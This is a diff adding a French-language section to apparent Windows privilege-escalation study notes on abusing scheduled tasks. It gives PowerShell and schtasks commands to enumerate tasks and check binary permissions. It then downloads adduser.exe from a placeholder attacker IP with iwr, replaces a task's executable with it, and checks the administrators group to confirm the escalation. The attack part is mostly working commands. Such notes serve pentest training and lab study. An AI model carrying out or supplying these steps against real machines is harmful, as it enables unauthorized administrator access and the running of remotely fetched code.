@@ -493,3 +493,51 @@ net start GammaService
 net user
 net localgroup administrators
 ```
+
+## Abusing Other Windows Components
+
+### Scheduled Tasks
+
+Points clés à identifier sur une tâche planifiée :
+- **Principal** : sous quel compte tourne la tâche (SYSTEM, admin ?)
+- **Trigger** : la condition d'exécution est-elle encore à venir ?
+- **Action** : quel binaire/script est exécuté, et peut-on le remplacer ?
+
+**Lister les tâches planifiées**
+
+```powershell
+Get-ScheduledTask | Select-Object URI, @{Name="RunAs";Expression={$_.Principal.UserId}}, @{Name="Execute";Expression={$_.Actions.Execute}} | Where-Object {$_.URI -notlike "\Microsoft\Windows\*"}
+
+Get-ScheduledTask | Select-Object URI, Author, Description
+
+Get-ScheduledTask | Select-Object URI, @{Name="RunAs";Expression={$_.Principal.UserId}}, @{Name="Execute";Expression={$_.Actions.Execute}}
+
+Get-ScheduledTask | Select-Object URI, @{Name="Execute";Expression={$_.Actions.Execute}}, @{Name="Arguments";Expression={$_.Actions.Arguments}}
+```
+
+```cmd
+schtasks /query /fo LIST /v
+
+schtasks /query /fo LIST /v /tn "URIDeLaTache"
+```
+
+**Vérifier les permissions sur le binaire de la tâche**
+
+```cmd
+icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
+```
+
+**Remplacer le binaire et attendre l'exécution**
+
+```powershell
+iwr -Uri http://<ip>/adduser.exe -Outfile BackendCacheCleanup.exe
+move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
+move .\BackendCacheCleanup.exe .\Pictures\
+```
+
+**Vérifier que l'exploitation a fonctionné**
+
+```cmd
+net user
+net localgroup administrators
+```
